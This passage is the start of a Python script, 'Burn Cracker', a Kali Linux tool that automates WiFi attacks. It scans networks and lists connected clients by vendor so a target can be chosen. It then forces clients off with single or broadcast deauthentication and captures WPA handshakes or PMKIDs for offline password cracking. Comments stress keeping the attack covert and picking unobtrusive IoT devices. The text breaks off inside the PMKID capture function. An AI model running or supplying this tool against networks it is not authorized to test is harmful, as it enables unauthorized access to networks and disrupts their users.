#!/usr/bin/env python3

# ================================================================
#  BURN CRACKER v1.0
#  Automated WiFi Handshake Capture & Password Cracker
#  Built for Kali Linux
#
#  LEGAL NOTICE: Only use on networks you own or have explicit
#  written permission to test. Unauthorized use is a federal crime.
#
#  Usage: sudo python3 ./burncracker.py
#
#  Copyright (C) 2026 Thomas Burns
#  License: GNU GPLv3 or later. Free software with NO WARRANTY; you may
#  redistribute and modify it under the GPL. See the LICENSE file or
#  <https://www.gnu.org/licenses/gpl-3.0.html>.
# ================================================================

import subprocess
import sys
import os
import csv
import time
import signal
import shutil
import datetime
import threading

# ----------------------------------------------------------------
# CONFIG
# ----------------------------------------------------------------
REPORT_DIR   = os.path.join(os.path.dirname(os.path.abspath(os.path.realpath(__file__))), "burn_report")
CAPTURE_DIR  = "/tmp/burncracker"
WORDLIST     = "/usr/share/wordlists/rockyou.txt"   # default / recommended first pass
WORDLIST_DIR = "/usr/share/wordlists"               # scanned for installed wordlists
SCAN_SECONDS = 20      # how long to scan for networks

# ----------------------------------------------------------------
# GLOBALS
# ----------------------------------------------------------------
monitor_active  = False
SELECTED_IFACE  = None   # set once the user picks an adapter — lets the
                          # fixed-signature SIGINT handler know what to restore
ACTIVE_PROCS    = set()   # live child processes, so Ctrl+C can kill them all
                          # instead of orphaning a running hashcat/airodump

# ----------------------------------------------------------------
# CHILD PROCESS TRACKING — every long-running child (crackers, airodump)
# is spawned into its own process group and tracked here, so cleanup() can
# tear the whole tree down (including any `sudo` parent) on Ctrl+C.
# ----------------------------------------------------------------
def spawn(cmd, **kwargs):
    """subprocess.Popen wrapper that isolates the child in its own process
    group and registers it for cleanup."""
    kwargs.setdefault("start_new_session", True)   # own group → killable as a unit
    proc = subprocess.Popen(cmd, **kwargs)
    ACTIVE_PROCS.add(proc)
    return proc

def _signal_group(proc, sig):
    """Send `sig` to proc's process group, but ONLY if that group is a real,
    positive pgid that is NOT our own — so a failed/mocked spawn (pid None or
    0) can never make us signal the whole session/terminal. os.getpgid(0)
    returns *our* group, which is exactly the footgun this guards against."""
    pid = getattr(proc, "pid", None)
    if not isinstance(pid, int) or pid <= 0:
        return
    try:
        pgid = os.getpgid(pid)
    except (ProcessLookupError, PermissionError, OSError):
        return
    if pgid <= 0 or pgid == os.getpgrp():   # never signal our own group
        return
    try:
        os.killpg(pgid, sig)
    except (ProcessLookupError, PermissionError, OSError):
        pass

def reap(proc, grace=5):
    """Stop a tracked child and its whole group, then untrack it."""
    if proc is None:
        return
    _signal_group(proc, signal.SIGTERM)
    try:
        proc.wait(timeout=grace)
    except Exception:
        _signal_group(proc, signal.SIGKILL)
    ACTIVE_PROCS.discard(proc)

def kill_active_procs():
    """Best-effort teardown of every tracked child — used by the SIGINT
    handler so an interrupt never leaves a cracker running in the background."""
    for p in list(ACTIVE_PROCS):
        _signal_group(p, signal.SIGTERM)
    time.sleep(0.5)
    for p in list(ACTIVE_PROCS):
        try:
            if p.poll() is None:
                _signal_group(p, signal.SIGKILL)
        except Exception:
            pass
        ACTIVE_PROCS.discard(p)

# ----------------------------------------------------------------
# SIGNAL HANDLER — clean up on Ctrl+C
# ----------------------------------------------------------------
def cleanup(sig=None, frame=None):
    print("\n\n\033[91m[!]\033[0m Interrupt received. Cleaning up...")
    kill_active_procs()   # kill children first, before restoring the interface
    if monitor_active and SELECTED_IFACE:
        stop_monitor(SELECTED_IFACE)
    print("\033[92m[+]\033[0m Done. Exiting.\n")
    sys.exit(0)

signal.signal(signal.SIGINT, cleanup)

# ----------------------------------------------------------------
# BANNER
# ----------------------------------------------------------------
def banner():
    print("""
\033[91m
  ██████╗ ██╗   ██╗██████╗ ███╗   ██╗
  ██╔══██╗██║   ██║██╔══██╗████╗  ██║
  ██████╔╝██║   ██║██████╔╝██╔██╗ ██║
  ██╔══██╗██║   ██║██╔══██╗██║╚██╗██║
  ██████╔╝╚██████╔╝██║  ██║██║ ╚████║
  ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝

   ██████╗██████╗  █████╗  ██████╗██╗  ██╗
  ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝
  ██║     ██████╔╝███████║██║     █████╔╝
  ██║     ██╔══██╗██╔══██║██║     ██╔═██╗
  ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗
   ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
\033[0m
\033[90m  Automated WiFi Handshake Capture & Password Cracker v1.0
  FOR AUTHORIZED TESTING ONLY. Only use on your own networks.
\033[0m""")

# ----------------------------------------------------------------
# HELPERS
# ----------------------------------------------------------------
def run(cmd, timeout=None, capture=True):
    """Run a shell command."""
    try:
        return subprocess.run(
            cmd, shell=isinstance(cmd, str),
            capture_output=capture, text=True, timeout=timeout
        )
    except subprocess.TimeoutExpired:
        return None
    except Exception as e:
        print(f"  \033[91m[!]\033[0m Command error: {e}")
        return None

def run_streaming(cmd, timeout=None, heartbeat=15,
                  activity="working — this can take a while",
                  capture=False, **popen_kwargs):
    """Run a command while streaming its output live to the terminal.

    Unlike run(), this echoes the child's stdout/stderr as they arrive, so
    the user sees continuous progress (e.g. hashcat's status blocks or
    aircrack-ng's live counters) instead of a blank screen. During any quiet
    stretch it prints an elapsed-time heartbeat so the run never looks hung.

    `activity` is the parenthetical shown in the heartbeat line. Set
    `capture=True` to also collect the streamed text for later inspection.
    Extra keyword args are passed through to Popen (e.g. stdin, stderr).

    Returns (returncode, output): returncode is None on timeout / launch
    error; output is the captured text when capture=True, else None."""
    popen_kwargs.setdefault("stderr", subprocess.STDOUT)
    try:
        proc = spawn(cmd, stdout=subprocess.PIPE, text=True, bufsize=1, **popen_kwargs)
    except Exception as e:
        print(f"  \033[91m[!]\033[0m Command error: {e}")
        return None, None

    start = time.time()
    last_output = [start]
    collected = [] if capture else None

    def reader():
        for line in proc.stdout:
            last_output[0] = time.time()
            if capture:
                collected.append(line)
            sys.stdout.write(line)
            sys.stdout.flush()

    t = threading.Thread(target=reader, daemon=True)
    t.start()

    def output():
        return "".join(collected) if capture else None

    # Ctrl+C is handled globally by cleanup(), which calls kill_active_procs()
    # to tear down this child — so we don't trap KeyboardInterrupt here. The
    # finally still untracks the process on every exit path.
    try:
        while proc.poll() is None:
            time.sleep(1)
            now = time.time()
            if timeout and (now - start) > timeout:
                reap(proc)
                print()
                print_status(f"Timed out after {int(now - start)}s — stopping.", "err")
                t.join(timeout=2)
                return None, output()
            if now - last_output[0] >= heartbeat:
                elapsed = int(now - start)
                m, s = divmod(elapsed, 60)
                print(f"  \033[90m[~] still cracking… {m}m{s:02d}s elapsed ({activity})\033[0m")
                last_output[0] = now
    finally:
        ACTIVE_PROCS.discard(proc)

    t.join(timeout=2)
    return proc.returncode, output()

def print_status(msg, level="info"):
    colors = {"info": "\033[93m", "ok": "\033[92m", "err": "\033[91m", "dim": "\033[90m"}
    prefix = {"info": "[*]", "ok": "[+]", "err": "[!]", "dim": "[~]"}
    c = colors.get(level, "\033[0m")
    p = prefix.get(level, "[*]")
    print(f"{c}{p}\033[0m {msg}")

def separator():
    print(f"\033[90m{'─'*60}\033[0m")

# ----------------------------------------------------------------
# DIAGNOSTICS — codes logged on failure/empty-result, see ERROR_CODES.txt
# ----------------------------------------------------------------
DIAGNOSTICS = []

def note(code, msg, level="dim"):
    print_status(f"{code}: {msg}", level)
    DIAGNOSTICS.append(f"{code}: {msg}")


# ----------------------------------------------------------------
# VM DETECTION
# ----------------------------------------------------------------
def check_vm():
    """Detect if running inside a Type 2 hypervisor."""
    indicators = []
    checks = [
        ("systemd-detect-virt", "systemd-detect-virt 2>/dev/null"),
        ("dmi", "sudo dmidecode -s system-product-name 2>/dev/null"),
        ("cpuinfo", "grep -i hypervisor /proc/cpuinfo 2>/dev/null"),
    ]
    vm_keywords = ["vmware", "virtualbox", "kvm", "qemu", "hyper-v", "parallels", "xen", "virtual"]

    for name, cmd in checks:
        result = run(cmd)
        if result and result.stdout.strip():
            out = result.stdout.strip().lower()
            if any(k in out for k in vm_keywords):
                indicators.append(out)

    return len(indicators) > 0

# ----------------------------------------------------------------
# WORDLIST CHECK
# ----------------------------------------------------------------
def human_size(path):
    """Human-readable size of a file, or '?' if it can't be read."""
    try:
        n = float(os.path.getsize(path))
    except OSError:
        return "?"
    for unit in ("B", "KB", "MB", "GB", "TB"):
        if n < 1024 or unit == "TB":
            return f"{n:.0f} {unit}" if unit == "B" else f"{n:.1f} {unit}"
        n /= 1024

def ensure_uncompressed(path):
    """Cracking tools can't read .gz wordlists directly. If given one,
    decompress it (keeping the original) and return the plain-text path.
    Returns None if decompression fails."""
    if not path.endswith(".gz"):
        return path
    target = path[:-3]
    if not os.path.exists(target):
        print_status(f"Decompressing {os.path.basename(path)} (one-time)...", "info")
        run(["gunzip", "-k", path])          # -k keeps the .gz original
    if os.path.exists(target):
        return target
    print_status(f"Decompression failed — {target} not found.", "err")
    return None

def check_wordlist():
    """Let the user pick an installed wordlist or supply a custom path.
    Returns an absolute path to an existing, uncompressed, readable file."""

    def ask_custom_path():
        while True:
            custom = os.path.expanduser(
                input("\033[93m[?]\033[0m Enter path to wordlist: ").strip())
            if custom and os.path.isfile(custom):
                resolved = ensure_uncompressed(custom)
                if resolved:
                    return resolved
            else:
                print_status("File not found — try again (Ctrl+C to abort).", "err")

    # Discover installed wordlists in the standard directory.
    found = []
    if os.path.isdir(WORDLIST_DIR):
        for name in sorted(os.listdir(WORDLIST_DIR)):
            path = os.path.join(WORDLIST_DIR, name)
            if os.path.isfile(path) and name.endswith((".txt", ".lst", ".txt.gz", ".lst.gz")):
                found.append(path)

    # Surface the recommended default first, if present (plain or .gz).
    default = None
    for cand in (WORDLIST, WORDLIST + ".gz"):
        if os.path.exists(cand):
            default = cand
            break
    if default and default in found:
        found.remove(default)
    if default:
        found.insert(0, default)

    if not found:
        print_status(f"No wordlists found in {WORDLIST_DIR}.", "err")
        return ask_custom_path()

    separator()
    print_status("Select a wordlist:", "info")
    for i, path in enumerate(found, 1):
        name = os.path.basename(path)
        tag = "  \033[90m← default\033[0m" if path == default else ""
        gz = " \033[90m(compressed)\033[0m" if path.endswith(".gz") else ""
        print(f"  \033[96m{i:>2}\033[0m  {name} \033[90m[{human_size(path)}]\033[0m{gz}{tag}")
    print(f"  \033[96m C\033[0m  Custom path (type your own)")
    separator()

    while True:
        choice = input("\033[93m[?]\033[0m Choose a wordlist (number or C): ").strip().lower()
        if choice == "c":
            return ask_custom_path()
        if choice.isdigit() and 1 <= int(choice) <= len(found):
            resolved = ensure_uncompressed(found[int(choice) - 1])
            if resolved:
                return resolved
            # Decompression failed — let them try another option.
            continue
        print_status(f"Enter a number 1-{len(found)}, or C.", "err")

# ----------------------------------------------------------------
# WIRELESS INTERFACE SELECTION
# ----------------------------------------------------------------
def list_wireless_interfaces():
    """Enumerate wireless interfaces via `iw dev`. Returns a list of
    {'iface': str, 'driver': str|None} dicts. The driver name is an
    informational hint only — never used to filter/auto-select, since
    hardcoding chipset detection would be fragile."""
    result = run("iw dev")
    if not result or result.returncode != 0 or not result.stdout.strip():
        return []
    interfaces = []
    for line in result.stdout.splitlines():
        line = line.strip()
        if line.startswith("Interface "):
            interfaces.append(line.split("Interface ", 1)[1].strip())
    return [{"iface": i, "driver": get_driver_name(i)} for i in interfaces]

def get_driver_name(iface):
    """Best-effort driver name for display, read directly from /sys —
    not shelled out, since iface names never need shell interpretation."""
    try:
        target = os.readlink(f"/sys/class/net/{iface}/device/driver")
        return os.path.basename(target)
    except OSError:
        return None

def select_interface():
    interfaces = list_wireless_interfaces()
    if not interfaces:
        note("CRACK-106", "No wireless interfaces found on this system — check that your adapter is plugged in and recognized (try: iw dev).", "err")
        return None

    separator()
    print(f"\033[92m  {'#':<4} {'INTERFACE':<12} DRIVER\033[0m")
    separator()
    for i, entry in enumerate(interfaces):
        driver_str = entry['driver'] if entry['driver'] else '?'
        print(f"  \033[96m{i:<4}\033[0m {entry['iface']:<12} \033[90m{driver_str}\033[0m")
    separator()
    print_status("Pick the adapter to dedicate to WiFi work (e.g. a USB adapter).", "dim")
    print_status("Any other interface — including whatever's keeping you online — is left alone.", "dim")

    while True:
        try:
            choice = int(input(f"\033[93m[?]\033[0m Select interface # (0-{len(interfaces)-1}): "))
            if 0 <= choice < len(interfaces):
                return interfaces[choice]['iface']
            print_status("Invalid selection.", "err")
        except ValueError:
            print_status("Enter a number.", "err")

# ----------------------------------------------------------------
# MONITOR MODE — scoped to the selected interface only. Never touches
# NetworkManager/wpa_supplicant system-wide (no more airmon-ng check kill),
# so other interfaces (e.g. the card keeping you online) are never disturbed.
# ----------------------------------------------------------------
def start_monitor(iface):
    global monitor_active
    monitor_active = True   # set before any command runs, so an interrupt
                             # mid-setup still triggers a best-effort restore

    if shutil.which("nmcli"):
        print_status(f"Releasing {iface} from NetworkManager (other interfaces untouched)...", "info")
        run(f"sudo nmcli device set {iface} managed no")
        time.sleep(1)
    else:
        note("CRACK-503", "nmcli/NetworkManager not found — skipping the per-interface isolation step (nothing to isolate from).", "dim")

    print_status(f"Switching {iface} to monitor mode...", "info")
    run(f"sudo ip link set {iface} down")
    run(f"sudo iw dev {iface} set type monitor")
    run(f"sudo ip link set {iface} up")
    time.sleep(2)

    info = run(f"iw dev {iface} info")
    if info and "type monitor" in info.stdout:
        print_status(f"Monitor mode active on {iface}", "ok")
        return True
    else:
        note("CRACK-201", "Monitor mode failed to start — VM without USB passthrough, or the card doesn't support monitor mode.", "err")
        print_status("Possible causes:", "dim")
        print_status("  - Running inside a VM without USB WiFi passthrough", "dim")
        print_status("  - Wireless card does not support monitor mode", "dim")
        stop_monitor(iface)   # revert whatever partial state iface was left in
        return False

def stop_monitor(iface):
    global monitor_active
    print_status(f"Restoring {iface} to normal (managed) mode...", "info")
    run(f"sudo ip link set {iface} down")
    run(f"sudo iw dev {iface} set type managed")
    run(f"sudo ip link set {iface} up")
    time.sleep(1)
    if shutil.which("nmcli"):
        run(f"sudo nmcli device set {iface} managed yes")
    monitor_active = False
    print_status(f"{iface} restored to normal mode.", "ok")

# ----------------------------------------------------------------
# AIRODUMP CSV PARSING — one parser for the whole file. An airodump CSV
# has two sections: access points, then a 'Station MAC' header, then
# associated stations. Split them once; every caller filters the rows it
# needs. (Replaces three near-identical copies of this walk.)
# ----------------------------------------------------------------
def read_airodump_csv(csv_file):
    """Return (ap_rows, station_rows) as raw CSV row lists."""
    aps, stations = [], []
    try:
        with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
            in_stations = False
            for row in csv.reader(f):
                if not row:
                    continue
                if row[0].strip() == 'Station MAC':
                    in_stations = True
                    continue
                (stations if in_stations else aps).append(row)
    except FileNotFoundError:
        pass
    except Exception as e:
        print_status(f"Error reading CSV: {e}", "err")
    return aps, stations

def count_all_stations(csv_file):
    """Map BSSID -> number of associated stations, parsing the CSV once."""
    _, station_rows = read_airodump_csv(csv_file)
    counts = {}
    for row in station_rows:
        if len(row) < 6:
            continue
        bssid = row[5].strip()
        if len(bssid) == 17:
            counts[bssid] = counts.get(bssid, 0) + 1
    return counts

# ----------------------------------------------------------------
# SCAN FOR NETWORKS
# ----------------------------------------------------------------
def scan_networks(iface):
    os.makedirs(CAPTURE_DIR, exist_ok=True)
    scan_file = f"{CAPTURE_DIR}/scan"

    # Clean up old scan files
    run(f"rm -f {scan_file}*.csv {scan_file}*.cap")

    print_status(f"Scanning all channels for {SCAN_SECONDS} seconds...", "info")
    print_status("Stand by...\n", "dim")

    # Run airodump for SCAN_SECONDS then kill it
    proc = spawn(
        ["sudo", "airodump-ng", "--output-format", "csv",
         "-w", scan_file, iface],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    time.sleep(SCAN_SECONDS)
    reap(proc)
    time.sleep(1)

    # Find the CSV
    csv_file = f"{scan_file}-01.csv"
    if not os.path.exists(csv_file):
        note("CRACK-301", "Network scan produced no CSV output — airodump-ng may have failed to start.", "err")
        return [], None

    networks = []
    ap_rows, _ = read_airodump_csv(csv_file)
    for row in ap_rows:
        if len(row) < 14:
            continue
        bssid = row[0].strip()
        if not bssid or bssid == 'BSSID' or len(bssid) != 17:
            continue
        channel = row[3].strip()
        enc     = row[5].strip()   # Privacy: WPA2, WPA3, "WPA2 WPA3", OPN, WEP
        cipher  = row[6].strip()   # CCMP, TKIP, ...
        auth    = row[7].strip()   # Authentication: PSK, SAE, "PSK SAE", MGT
        essid   = row[13].strip()
        pwr     = row[8].strip()
        # Relabel blank/hidden SSIDs. OPN networks are still listed here;
        # they're rejected later at crack time (nothing to crack).
        if not essid or essid == '\\x00':
            essid = '<hidden>'
        networks.append({
            'bssid':   bssid,
            'channel': channel,
            'enc':     enc,
            'cipher':  cipher,
            'auth':    auth,
            'essid':   essid,
            'pwr':     pwr
        })

    # Deduplicate by BSSID
    seen = set()
    unique = []
    for n in networks:
        if n['bssid'] not in seen:
            seen.add(n['bssid'])
            unique.append(n)

    return unique, csv_file

# ----------------------------------------------------------------
# SECURITY CLASSIFICATION — decide what (if anything) is attackable, from
# the airodump Privacy (enc) and Authentication (auth) fields. This is what
# keeps the tool honest about WPA3: SAE is designed to resist offline
# dictionary attacks, so a WPA3-only network is declined rather than churned.
# ----------------------------------------------------------------
def classify_security(enc, auth):
    """Return one of:
      'open'            - no encryption; nothing to crack
      'enterprise'      - 802.1X/EAP (MGT); no PSK to dictionary-attack
      'wpa3-sae'        - WPA3-only (SAE); offline dictionary attack infeasible
      'wpa3-transition' - mixed WPA2/WPA3; attackable via the WPA2 (PSK) path
      'wpa-psk'         - WPA/WPA2 PSK; the standard crackable case
    """
    e = (enc or "").upper()
    a = (auth or "").upper()
    if not e or e == "OPN":
        return "open"
    if "MGT" in a:                       # 802.1X / enterprise
        return "enterprise"
    has_sae = "SAE" in a
    has_psk = "PSK" in a
    # Transition/mixed: AP advertises both WPA2(PSK) and WPA3(SAE).
    if (has_sae and has_psk) or ("WPA3" in e and "WPA2" in e):
        return "wpa3-transition"
    # WPA3-only: SAE with no PSK fallback (or WPA3 Privacy and no PSK auth).
    if has_sae or ("WPA3" in e and not has_psk):
        return "wpa3-sae"
    return "wpa-psk"

# ----------------------------------------------------------------
# DISPLAY NETWORK LIST
# ----------------------------------------------------------------
def display_networks(networks, csv_file=None):
    separator()
    print(f"\033[92m  {'#':<4} {'SSID':<28} {'BSSID':<20} {'CH':<5} {'ENC':<10} {'PWR':<6} DEVICES\033[0m")
    separator()
    # Parse station counts once for the whole table (not once per row).
    counts = count_all_stations(csv_file) if csv_file and os.path.exists(csv_file) else None
    for i, n in enumerate(networks):
        enc_color = "\033[91m" if n['enc'] in ('WPA2', 'WPA', 'WPA3') else "\033[93m"
        pwr = n['pwr'] if n['pwr'] else '?'
        if counts is None:
            dev_str = f"\033[90m?\033[0m"
        else:
            device_count = counts.get(n['bssid'], 0)
            # The broad scan hops channels too fast to reliably catch client
            # frames, so a 0 here means "none seen in scan", not "confirmed
            # empty" — show a dash to avoid implying certainty. Real per-AP
            # device detection happens in get_stations() after target select.
            dev_str = f"\033[92m{device_count} connected\033[0m" if device_count > 0 else f"\033[90m—\033[0m"
        print(f"  \033[96m{i:<4}\033[0m "
              f"{n['essid'][:27]:<28} "
              f"\033[90m{n['bssid']:<20}\033[0m "
              f"\033[93m{n['channel']:<5}\033[0m "
              f"{enc_color}{n['enc']:<10}\033[0m "
              f"\033[90m{pwr:<6}\033[0m "
              f"{dev_str}")
    separator()
    if counts is not None:
        print_status("DEVICES is scan-only — '—' means none seen in the quick scan, "
                     "not confirmed empty. Exact clients are counted after you pick a target.", "dim")


# ----------------------------------------------------------------
# GET CONNECTED STATIONS for target network
# ----------------------------------------------------------------
def get_stations(target, iface):
    os.makedirs(CAPTURE_DIR, exist_ok=True)
    station_file = f"{CAPTURE_DIR}/stations"
    run(f"rm -f {station_file}*.csv")

    print_status(f"Scanning for devices on {target['essid']}...", "info")
    proc = spawn(
        ["sudo", "airodump-ng",
         "-c", target['channel'],
         "--bssid", target['bssid'],
         "--output-format", "csv",
         "-w", station_file,
         iface],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    time.sleep(10)
    reap(proc)
    time.sleep(1)

    csv_file = f"{station_file}-01.csv"
    stations = []
    _, station_rows = read_airodump_csv(csv_file)
    for row in station_rows:
        if len(row) < 6:
            continue
        mac = row[0].strip()
        if not mac or len(mac) != 17:
            continue
        if row[5].strip() == target['bssid']:
            stations.append(mac)

    return stations

# ----------------------------------------------------------------
# MAC VENDOR LOOKUP — offline OUI resolution so the device list shows who
# made each client (Amazon, Espressif, Apple...), which is how you pick the
# unobtrusive IoT target to deauth. No network calls: leaking target MACs to
# an online API would defeat the point. The client's real *hostname* isn't
# available here — that rides in encrypted IP traffic we can't read until
# the key is cracked and we're on the network — so vendor is the best signal.
# ----------------------------------------------------------------
OUI_FILES = [
    "/usr/share/nmap/nmap-mac-prefixes",   # clean "AABBCC Vendor" format
    "/usr/share/ieee-data/oui.txt",        # IEEE registry fallback
    "/var/lib/ieee-data/oui.txt",
]
_OUI_MAP = None   # lazily parsed prefix -> vendor, built once on first use

def _load_oui():
    global _OUI_MAP
    if _OUI_MAP is not None:
        return _OUI_MAP
    _OUI_MAP = {}
    for path in OUI_FILES:
        if not os.path.exists(path):
            continue
        try:
            with open(path, encoding="utf-8", errors="ignore") as f:
                for line in f:
                    if path.endswith("oui.txt"):
                        # IEEE: "AA-BB-CC   (hex)\t\tVendor Name"
                        if "(hex)" not in line:
                            continue
                        left, _, vendor = line.partition("(hex)")
                        prefix = left.strip().replace("-", "").upper()
                        vendor = vendor.strip()
                    else:
                        # nmap: "AABBCC Vendor Name"
                        line = line.strip()
                        if not line or line.startswith("#"):
                            continue
                        parts = line.split(None, 1)
                        if len(parts) != 2:
                            continue
                        prefix, vendor = parts[0].upper(), parts[1].strip()
                    if len(prefix) == 6 and vendor:
                        _OUI_MAP.setdefault(prefix, vendor)
        except Exception:
            continue
        if _OUI_MAP:
            break   # first usable file wins
    return _OUI_MAP

def mac_vendor(mac):
    """Best-effort vendor for a MAC. Flags locally-administered (randomized)
    MACs — modern phones rotate these, so their OUI is meaningless. Returns a
    short label, or '' if the MAC is malformed."""
    hexmac = mac.replace(":", "").replace("-", "").upper()
    if len(hexmac) < 6:
        return ""
    try:
        first_octet = int(hexmac[:2], 16)
    except ValueError:
        return ""
    if first_octet & 0x02:   # locally-administered bit => randomized MAC
        return "randomized (phone?)"
    return _load_oui().get(hexmac[:6], "unknown vendor")

# ----------------------------------------------------------------
# CAPTURE HANDSHAKE
# ----------------------------------------------------------------
def capture_handshake(target, stations, iface):
    cap_prefix = f"{CAPTURE_DIR}/handshake"
    run(f"rm -f {cap_prefix}*.cap")

    do_deauth   = False
    target_mac  = None
    broadcast   = False

    if stations:
        # ---- Devices found — show menu ----
        print_status(f"Found {len(stations)} connected device(s) on this network.", "ok")
        for i, mac in enumerate(stations):
            print(f"  \033[96m{i}\033[0m  {mac}  \033[90m{mac_vendor(mac)}\033[0m")
        print()
        print(f"  \033[96m1\033[0m  Deauth a single device")
        print(f"  \033[91m2\033[0m  Deauth ALL devices (broadcast)")
        print(f"  \033[90m3\033[0m  Skip deauth — wait passively for handshake")
        print()

        # Loop the whole choice so an unconfirmed broadcast returns here
        # instead of silently falling through to passive capture.
        while True:
            choice = input("\033[93m[?]\033[0m Choose option (1/2/3): ").strip()
            if choice not in ('1', '2', '3'):
                print_status("Enter 1, 2, or 3.", "err")
                continue

            if choice == '1':
                # Single device deauth
                if len(stations) == 1:
                    target_mac = stations[0]
                    print_status(f"Will deauth: {target_mac} ({mac_vendor(target_mac)})", "info")
                else:
                    while True:
                        try:
                            idx = int(input(f"\033[93m[?]\033[0m Select device # (0-{len(stations)-1}): "))
                            if 0 <= idx < len(stations):
                                target_mac = stations[idx]
                                print_status(f"Will deauth: {target_mac} ({mac_vendor(target_mac)})", "info")
                                break
                            else:
                                print_status("Invalid selection.", "err")
                        except ValueError:
                            print_status("Enter a number.", "err")
                do_deauth = True
                break

            elif choice == '2':
                # Broadcast deauth — require an EXACT "CONFIRM". Anything else,
                # including a blank Enter, sends nothing and returns to the
                # menu, so a stray keypress can't silently change your attack.
                print()
                print_status("WARNING: This will disconnect ALL devices on the network.", "err")
                confirm = input("\033[91m[!]\033[0m Type CONFIRM to proceed (or Enter to go back): ").strip()
                if confirm == 'CONFIRM':
                    broadcast = True
                    do_deauth = True
                    print_status("Broadcast deauth confirmed.", "ok")
                    break
                print_status("Not confirmed — nothing sent. Returning to the menu.", "dim")
                continue

            else:   # choice == '3'
                print_status("Skipping deauth — waiting passively for handshake.", "dim")
                break

    else:
        # ---- No devices found — show options ----
        print_status("No connected devices detected on this network.", "dim")
        print()
        print(f"  \033[96m1\033[0m  Wait indefinitely — scan until a device connects")
        print(f"  \033[96m2\033[0m  Choose a different target")
        print(f"  \033[90m3\033[0m  Continue anyway — capture passively")
        print()

        while True:
            choice = input("\033[93m[?]\033[0m Choose option (1/2/3): ").strip()
            if choice in ('1', '2', '3'):
                break
            print_status("Enter 1, 2, or 3.", "err")

        if choice == '2':
            return None, True   # Signal to main to re-select target

        elif choice == '1':
            print_status("Scanning indefinitely — press Ctrl+C to stop.", "info")
            # Keep scanning in a loop until a device shows up
            while not stations:
                stations = get_stations(target, iface)
                if stations:
                    print_status(f"Device connected: {stations[0]} ({mac_vendor(stations[0])})", "ok")
                    target_mac = stations[0]
                    do_deauth  = True
                    break
                print_status("Still waiting for a device...", "dim")
                time.sleep(10)

        else:
            print_status("Continuing with passive capture.", "dim")

    print_status(f"Starting handshake capture on {target['essid']}...", "info")

    # Start airodump with stdin closed
    capture_proc = spawn(
        ["sudo", "airodump-ng",
         "-c", target['channel'],
         "--bssid", target['bssid'],
         "--output-format", "cap",
         "-w", cap_prefix,
         iface],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        stdin=subprocess.DEVNULL
    )

    time.sleep(3)

    # Fire deauth
    if do_deauth:
        if broadcast:
            print_status("Sending broadcast deauth to all devices...", "info")
            run(f"sudo aireplay-ng -0 3 -a {target['bssid']} {iface}")
        elif target_mac:
            # Targeted (unicast) deauth only — no broadcast frames, so we
            # nudge just this one client and stay as covert as possible.
            print_status(f"Deauthing {target_mac} (targeted — covert)...", "info")
            run(f"sudo aireplay-ng -0 3 -a {target['bssid']} -c {target_mac} {iface}")

    # Poll for handshake
    print_status("Waiting for handshake capture (up to 30 seconds)...", "info")
    handshake_found = False
    cap_file = f"{cap_prefix}-01.cap"

    for i in range(30):
        time.sleep(1)
        check = run(f"sudo aircrack-ng {cap_file} 2>/dev/null")
        if check and "1 handshake" in check.stdout.lower():
            handshake_found = True
            break
        # Retry deauth every 10 seconds
        if do_deauth and i > 0 and i % 10 == 0:
            if broadcast:
                run(f"sudo aireplay-ng -0 1 -a {target['bssid']} {iface}")
            elif target_mac:
                run(f"sudo aireplay-ng -0 1 -a {target['bssid']} -c {target_mac} {iface}")

    reap(capture_proc)

    if handshake_found:
        print_status("Handshake captured successfully!", "ok")
        return cap_file, False
    else:
        note("CRACK-302", "No handshake captured — no client connected, or deauth did not force a reconnect (may indicate PMF/802.11w protection).", "err")
        return None, False

# ----------------------------------------------------------------
# CLIENTLESS PMKID CAPTURE (hcxdumptool)
# ----------------------------------------------------------------
def choose_capture_method(iface):
    """Ask how to obtain a crackable hash. PMKID is only offered when
    hcxdumptool is installed; otherwise we go straight to the handshake
    method with no pointless prompt."""
    if not shutil.which("hcxdumptool"):
        return "handshake"
    separator()
    print_status("Select capture method:", "info")
    print(f"  \033[96m1\033[0m  Handshake  (deauth a client to force a 4-way handshake)")
    print(f"  \033[96m2\033[0m  PMKID      (clientless — request it from the AP, no deauth; quieter)")
    separator()
    while True:
        choice = input("\033[93m[?]\033[0m Choose capture method (1/2): ").strip()
        if choice == "1":
            return "handshake"
        if choice == "2":
            return "pmkid"
        print_status("Enter 1 or 2.", "err")

def capture_pmkid(target, iface, seconds=30):
    """Clientless PMKID capture via hcxdumptool — pulls the PMKID straight
    from the AP (in EAPOL M1), needing no client and no deauth, so it's
    quiet. Returns (capture_path, reselect=False). The pcapng is cracked
    through the same mode-22000 path as a handshake (hashcat recommended).

    hcxdumptool's CLI is version-specific; these flags target 6.3.x, and
    hcxdumptool manages the interface/monitor mode itself. On any failure we
    validate the result and report rather than assume success."""
    out = f"{CAPTURE_DIR}/pmkid.pcapng"
    run(f"rm -f {out}")
    bssid_hex = target['bssid'].replace(":", "").lower()

    print_status(f"Clientless PMKID capture on {target['essid']} (up to {seconds}s)...", "info")
    print_status("Requesting the PMKID directly from the AP — no client, no deauth.", "dim")
    separator()

    # -c: sit on the target's channel   -t: hcxdumptool self-terminates
    # --filterlist_ap + --filtermode=2: attack only this BSSID
    # --disable_deauthentication: clientless/covert (PMKID needs no deauth)
    cmd = ["sudo", "hcxdumptool", "-i", iface,
           "-w", out,
           "-c", str(target['channel']),
           "-t", str(seconds),
           f"--filterlist_ap={bssid_hex}", "--filtermode=2",
           "--disable_deauthentication",
           "--enable_status=1"]
    run_streaming(cmd, timeout=seconds + 15, activity="listening for PMKID")

    separator()

    if not os.path.exists(out) or os.path.getsize(out) == 0:
        note("CRACK-305", "hcxdumptool captured nothing — no PMKID obtained (the AP may not expose a PMKID, or hcxdumptool's CLI differs on this version).", "err")
        return None, False

    # Confirm the capture actually holds a crackable PMKID/handshake before
    # handing it to the cracker (mode 22000 covers PMKID and EAPOL alike).
    hc_file, _ = convert_to_hccapx(out)
    if not hc_file:
        note("CRACK-306", "Capture holds no PMKID or handshake — nothing crackable (this AP may not be PMKID-vulnerable).", "err")
        return None, False

